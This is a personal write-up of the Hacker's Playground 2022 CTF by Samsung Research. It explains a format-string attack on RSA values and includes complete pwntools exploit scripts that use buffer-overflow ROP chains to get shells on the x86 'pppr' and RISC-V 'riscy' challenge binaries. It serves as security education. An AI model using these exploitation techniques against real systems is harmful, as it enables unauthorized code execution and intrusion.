# Hacker's Playground 2022

A 24h CTF Organized by Security Team of Samsung Research.

I played as a member of Soteria Team & together, we ranked 21th out of more than 700 teams.

I really enjoyed playing in this CTF & I wished it would be longer. There were some creative & hard challenges that were fun to play & discover. I've managed to solve 2 pwn challenges, helped in few & made progress in few other challenges.

------------

- [Pwn](#pwn)
    -  [pppr](#pwn1 "Writeup")
	-  [riscy](#pwn2 "Writeup")

- [Pwn&Crypto](#pwncrypto)
    -  [Secure Runner 1/2](#securerunner)

------------

### Pwn
1. <p name="pwn1"><b>pppr</b></p>

For this one, we were given a [decompiled source code](/2022/Hacker's%20Playground%202022/sources/decompiled.c) from IDA & a x86 binary. Looking at the source code, we have a function used to read from `stdin`, this should be an equivalent to `fgets`:

```c
int __cdecl r(int a1, unsigned int a2, int a3)
{
  int result; // eax
  char v4; // [esp+3h] [ebp-9h]
  unsigned int i; // [esp+4h] [ebp-8h]

  if ( a3 )
  {
    puts("r() works only for stdin.");
    result = -1;
  }
  else
  {
    for ( i = 0; a2 > i; ++i )
    {
      v4 = fgetc(stdin);
      if ( v4 == -1 || v4 == 10 )
        break;
      *(_BYTE *)(a1 + i) = v4;
    }
    *(_BYTE *)(i + a1) = 0;
    result = i;
  }
  return result;
}
```

Looking at our main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[4]; // [esp+0h] [ebp-8h] BYREF

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  alarm(0xAu);

  r(v4, 64, 0);
  return 0;
}
```

We are clearly able to write out of bound of `v4` variable, this is our **BOF**. We also have the function `system` used in function `x` therefore we can use this instead of a **ret2libc**.

Checking the security of the binary, we have PIE disabled so we can write our `/bin/sh` into the binary & use it to call `system`. Later on I used `sh` only instead of `/bin/sh`, luckly `/bin` was in the **PATH** variable.

Plan is, write `sh` to a known & writeable address alongside a `system` address to call it with `sh` string. We then stack pivot to that address to make our call & get a shell. Solver:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pppr")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pppr.sstf.site", 1337)

    return r


def main():
    r = conn()
    
    writeable = 0x804a000+0xa00
    leave_ret = 0x08048643
    
    payload = b"A"*8
    payload += p32(writeable+len('sh')+26) # ebp
    payload += p32(exe.symbols.r)
    payload += p32(leave_ret) # ret to leave - Stack pivot
    payload += p32(writeable)
    payload += p32(0x100)
    payload += p32(0)
    
    r.sendline(payload)
    
    payload2 = b'sh\0' 
    payload2 += b'A'*25 # padding
    payload2 += p32(0)
    payload2 += p32(exe.symbols.x)
    payload2 += p32(0)
    payload2 += p32(writeable)
    
    pause()
    r.sendline(payload2)

    r.interactive() # SCTF{Anc13nt_x86_R0P_5kiLl}


if __name__ == "__main__":
    main()
```

<br />

2. <p name="pwn2"><b>riscy</b></p>

This one was an interesting challenge, we were given a RISC-V binary to pwn it. We got the source & deployment binary with an emulator to run it, feel free to check [here](/2022/Hacker's%20Playground%202022/sources/riscy/).

As a start, we'll need to gather few information about this architecture. This will be for RISC-V 64bit.

* Registerss
    - `a0` --> `a7` used for function arguments.
    - `a7` used for syscall number.
    - `t3` --> `t6` temporary registers.
    - `sp` used as a stack pointer. (Equivalent to `rsp`)
    - `ra` used as a return address. (More details below)

* Assembly Instructions

    We'll look for the most important instructions, which would be useful for us now. 
    
    - `ld`: Load values from memory (can be indexed with an offset) to a register. Example: `ld a0, 20(sp)` loads 8 bytes into `a0` from the address `sp+20`.
    - `mv`: Equivalent to `mov` instruction for x86_64.
    - `ret`: Return to the address stored in `ra`.
    - `ecall`: Equivalent to `syscall`.
    - `jr`: Equivalent to `jmp`.

Now we can start digging. Looking at the given source code, we have a `start` function:

```c
void start() {
  printf("IOLI Crackme Level 0x00\n");
  printf("Password:");

  char buf[32];
  memset(buf, 0, sizeof(buf));
  read(0, buf, 256);
  
  if (!strcmp(buf, "250382"))
    printf("Password OK :)\n");
  else
    printf("Invalid Password!\n");
}
```

We clearly have a **BOF**, giving us 256-32 = 224 bytes for the overflow. The problem now, we'll need ROP gadgets but there is no known tool (as far as I've searched) to find them. While searching, I found this writeup ([REF](https://ctftime.org/writeup/33162)) & apparently we should have this well known gadget to set all of the `aX` registers.

Time for the old, painful way!

We can dump the assembly code using `/usr/riscv64-linux-gnu/bin/objdump -d ./target`. You can find the dumped file [here](/2022/Hacker's%20Playground%202022/sources/riscy/deploy/gads). Thanks to grep & regex, we can find our gadget:

```assembly
    0x41782 <_dl_runtime_resolve+54>:	mv	t1,a0
    0x41784 <_dl_runtime_resolve+56>:	ld	ra,72(sp)
    0x41786 <_dl_runtime_resolve+58>:	ld	a0,8(sp)
    0x41788 <_dl_runtime_resolve+60>:	ld	a1,16(sp)
    0x4178a <_dl_runtime_resolve+62>:	ld	a2,24(sp)
    0x4178c <_dl_runtime_resolve+64>:	ld	a3,32(sp)
    0x4178e <_dl_runtime_resolve+66>:	ld	a4,40(sp)
    0x41790 <_dl_runtime_resolve+68>:	ld	a5,48(sp)
    0x41792 <_dl_runtime_resolve+70>:	ld	a6,56(sp)
    0x41794 <_dl_runtime_resolve+72>:	ld	a7,64(sp)
    0x41796 <_dl_runtime_resolve+74>:	fld	fa0,80(sp)
    0x41798 <_dl_runtime_resolve+76>:	fld	fa1,88(sp)
    0x4179a <_dl_runtime_resolve+78>:	fld	fa2,96(sp)
    0x4179c <_dl_runtime_resolve+80>:	fld	fa3,104(sp)
    0x4179e <_dl_runtime_resolve+82>:	fld	fa4,112(sp)
    0x417a0 <_dl_runtime_resolve+84>:	fld	fa5,120(sp)
    0x417a2 <_dl_runtime_resolve+86>:	fld	fa6,128(sp)
    0x417a4 <_dl_runtime_resolve+88>:	fld	fa7,136(sp)
    0x417a6 <_dl_runtime_resolve+90>:	addi	sp,sp,144
    0x417a8 <_dl_runtime_resolve+92>:	jr	t1
```

Examining our gadget, it starts with `mv	t1,a0` & ends with `jr	t1` therefore, in order to keep control of the execution flow, we'll need to control `a0` register before jumping to our gadget else we'll lose control. Which explains the use of the second gadget:

```assembly
    0x4602e <__dlopen+42>:	ld	ra,40(sp)
    0x46030 <__dlopen+44>:	ld	a0,16(sp)
    0x46032 <__dlopen+46>:	addi	sp,sp,48
    0x46034 <__dlopen+48>:	ret
```

Using this gadget, we can control the `ra` register value & jump to it using the `ret` at the end. We also have the ability to set `a0` value. With this, we can call our first gadget without losing control of the execution.

Now we can start ROPing! Our plan:
    - We write "/bin/sh" to a known address. Checking the binary security, PIE is disabled. We can use `read` for that.
    - We use a syscall for `execve` using our string.

The only problem we'll be facing is the payload length. At first I tried looking for other gadgets to chain since the current ones require a lot of stack space but later on I figured out an other solution.

The current stack space is enough for setting our `a0` register & then setting up registers for a `read` call then return to `start` function again! And this will give us an other **BOF** to abuse!

For the second stage, we'll setup the registers for a `ecall` instruction to call `execve`.

Code part, we'll start with setting up few constants:

```python
gad_set_all     = 0x41782
gad_set_a0      = 0x4602e

read            = 0x00000000000260da
ecall           = 0x1414a
writeable       = 0x0006c000
start           = 0x0000000000010434
```

Now the first stage payload:

```python
payload = b"a"*40           # padding
payload += p64(gad_set_a0)  # ra register - ret value

# gad set a0
# 16 bytes padding - a0 value - 16 bytes padding - ra value to ret
payload += p64(0x69696969)*2 + p64(read) + p64(0x69696969)*2 + p64(gad_set_all)

# gad set all
payload += p64(0x69696969)  # padding
payload += p64(0)           # a0
payload += p64(writeable)   # a1
payload += p64(0x500)       # a2
payload += p64(0)*5         # padding (a3,a4,a5,a6,a7)
payload += p64(start)       # ra register - ret to start for stage 2
payload += p64(0)*8         # padding
```

We'll then send a "/bin/sh" for the `read`. After that, we start our stage 2, it'll be similar to stage 1:

```python
payload = b"a"*40           # padding
payload += p64(gad_set_a0)  # ra register - ret value

# gad set a0
# 16 bytes padding - a0 value - 16 bytes padding - ra value to ret
payload += p64(0x69696969)*2 + p64(ecall) + p64(0x69696969)*2 + p64(gad_set_all)

# gad set all
# setup for execve("/bin/sh", NULL, NULL)
payload += p64(0x69696969)      # padding
payload += p64(writeable)       # a0 : "/bin/sh"
payload += p64(0)               # a1 : NULL
payload += p64(0)               # a2 : NULL
payload += p64(0)*4             # padding
payload += p64(221)             # a7 - syscall number
payload += p64(0)               # ret, not used now
payload += p64(0)*8             # padding
```

For the syscall number, here is a [REF](https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html) for a syscall table for multiple architectures.

Full solver ([Link](/2022/Hacker's%20Playground%202022/sources/riscy/deploy/solve.py)):

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./target")


def conn():
    if args.LOCAL:
        r = process(["./qemu-riscv64", "./target"])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("riscy.sstf.site", 18223 )

    return r


def main():
    r = conn()
    
    # Used gadgets
    ''' set_all_gad
    
        0x41782 <_dl_runtime_resolve+54>:	mv	t1,a0
        0x41784 <_dl_runtime_resolve+56>:	ld	ra,72(sp)
        0x41786 <_dl_runtime_resolve+58>:	ld	a0,8(sp)
        0x41788 <_dl_runtime_resolve+60>:	ld	a1,16(sp)
        0x4178a <_dl_runtime_resolve+62>:	ld	a2,24(sp)
        0x4178c <_dl_runtime_resolve+64>:	ld	a3,32(sp)
        0x4178e <_dl_runtime_resolve+66>:	ld	a4,40(sp)
        0x41790 <_dl_runtime_resolve+68>:	ld	a5,48(sp)
        0x41792 <_dl_runtime_resolve+70>:	ld	a6,56(sp)
        0x41794 <_dl_runtime_resolve+72>:	ld	a7,64(sp)
        0x41796 <_dl_runtime_resolve+74>:	fld	fa0,80(sp)
        0x41798 <_dl_runtime_resolve+76>:	fld	fa1,88(sp)
        0x4179a <_dl_runtime_resolve+78>:	fld	fa2,96(sp)
        0x4179c <_dl_runtime_resolve+80>:	fld	fa3,104(sp)
        0x4179e <_dl_runtime_resolve+82>:	fld	fa4,112(sp)
        0x417a0 <_dl_runtime_resolve+84>:	fld	fa5,120(sp)
        0x417a2 <_dl_runtime_resolve+86>:	fld	fa6,128(sp)
        0x417a4 <_dl_runtime_resolve+88>:	fld	fa7,136(sp)
        0x417a6 <_dl_runtime_resolve+90>:	addi	sp,sp,144
        0x417a8 <_dl_runtime_resolve+92>:	jr	t1

    '''
    
    '''gad_set_a0
        0x4602e <__dlopen+42>:	ld	ra,40(sp)
        0x46030 <__dlopen+44>:	ld	a0,16(sp)
        0x46032 <__dlopen+46>:	addi	sp,sp,48
        0x46034 <__dlopen+48>:	ret
    '''
    
    # Constants
    gad_set_all     = 0x41782
    gad_set_a0      = 0x4602e
    
    read            = 0x00000000000260da
    ecall           = 0x1414a
    writeable       = 0x0006c000
    start           = 0x0000000000010434
    
    # Stage 1
    payload = b"a"*40           # padding
    payload += p64(gad_set_a0)  # ra register - ret value

    # gad set a0
    # 16 bytes padding - a0 value - 16 bytes padding - ra value to ret
    payload += p64(0x69696969)*2 + p64(read) + p64(0x69696969)*2 + p64(gad_set_all)

    # gad set all
    payload += p64(0x69696969)  # padding
    payload += p64(0)           # a0
    payload += p64(writeable)   # a1
    payload += p64(0x500)       # a2
    payload += p64(0)*5         # padding (a3,a4,a5,a6,a7)
    payload += p64(start)       # ra register - ret to start for stage 2
    payload += p64(0)*8         # padding
    
    r.sendline(payload)
    
    pause()
    
    r.sendline('/bin/sh\0')
    
    pause()
    
    # stage 2
    payload = b"a"*40           # padding
    payload += p64(gad_set_a0)  # ra register - ret value

    # gad set a0
    # 16 bytes padding - a0 value - 16 bytes padding - ra value to ret
    payload += p64(0x69696969)*2 + p64(ecall) + p64(0x69696969)*2 + p64(gad_set_all)

    # gad set all
    # setup for execve("/bin/sh", NULL, NULL)
    payload += p64(0x69696969)      # padding
    payload += p64(writeable)       # a0 : "/bin/sh"
    payload += p64(0)               # a1 : NULL
    payload += p64(0)               # a2 : NULL
    payload += p64(0)*4             # padding
    payload += p64(221)             # a7 - syscall number
    payload += p64(0)               # ret, not used now
    payload += p64(0)*8             # padding
    
    r.sendline(payload)
    
    r.interactive() # SCTF{Ropping RISCV is no difference!}


if __name__ == "__main__":
    main()
```

<br>

### Pwn&Crypto
1. <p name="securerunner"><b>Secure runner 1 & 2</b></p>

For this one, I took care of the pwn part, which involved a format string exploit to zero-out 4 bytes of RSA Encryption values in order to generate a valid signature to run `cat /flag.txt`. My team mate, Yassine Belarbi (**SSONEDE**) took care of the RSA signing part.

Both challenges were the same (Pwn part) only a different offset to write..

Basic information:

For RSA signing, we require an exponent e, 2 **secret** prime numbers, p & q. These values generate our public & private keys: N & d.

```
N = p*q.
d = inverse(e, (p-1)*(q-1)).
```

N & d are used to generate & verify the signatures.

Now the challenge part. We were given a binary that gives us the following services:

<p align="center">
    <img src="/2022/Hacker's%20Playground%202022/images/secure_runner.png">
</p>

We have 2 more hidden services, we can see them in IDA/Ghidra.

```
0. Recalculate N & display the value, doesn't update the actual N used by the signer.
9999. Format string vuln.
```

The binary is using a library to generate RSA values since they are very large values for security reasons. This library stores the values in heap. In the format string option, we give an integer which gets added to a heap address, stored in stack. Then we can give a string of 4 characters + null byte which gets passed to a `printf` call as a format parameter.

Examining the stack, due to the length limit, we can leak arguments/values from stack & registers from 1 to 9 since our limit would be `%9$p` is 4 characters therefore, leaking would not help.

Instead, we have the ability to index a heap address stored in heap & accessible to us (Index 7). We can use this address to arbitrary write 4 null bytes to a specific heap address. (Offsets between heap addresses are constant)

However, we can write only once! Here comes the crypto part. For the first Runner, we zeroed 4 bytes of N, located at offset `-2704`. For the second Runner, the binary added a check to make sure N isn't changed so for this one, we changed the exponent e.

I didn't go much into the details of the Crypto side since I still have a way to go since I only have the basics of RSA encryption. Hopefully I'll be able to handle this kind of challenges on my own in the future.ss